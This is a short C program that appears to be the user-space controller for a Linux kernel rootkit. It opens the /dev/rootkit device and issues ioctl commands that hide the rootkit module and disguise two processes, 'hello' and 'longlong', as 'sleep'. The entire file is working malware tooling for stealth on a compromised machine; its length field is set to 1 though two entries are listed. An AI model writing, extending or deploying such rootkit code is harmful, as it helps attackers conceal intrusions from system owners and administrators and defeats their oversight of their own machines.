#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include "rootkit.h"

int main(void) {

	int fd;

	fd = open("/dev/rootkit", O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "failed to open /dev/rootkit: %s\n", strerror(errno));
		exit(-1);
	}

	if (ioctl(fd, IOCTL_MOD_HIDE) < 0) {
		fprintf(stderr, "ioctl failed\n");
		exit(-1);
	}

	struct masq_proc masq[] = {
		{ "hello", 		"sleep" },
		{ "longlong", 	"sleep" },
	};
	struct masq_proc_req req = {
		.len = 1,
		.list = masq,
	};
	if (ioctl(fd, IOCTL_MOD_MASQ, &req) < 0) {
		fprintf(stderr, "ioctl failed\n");
		exit(-1);
	}

	return 0;
}
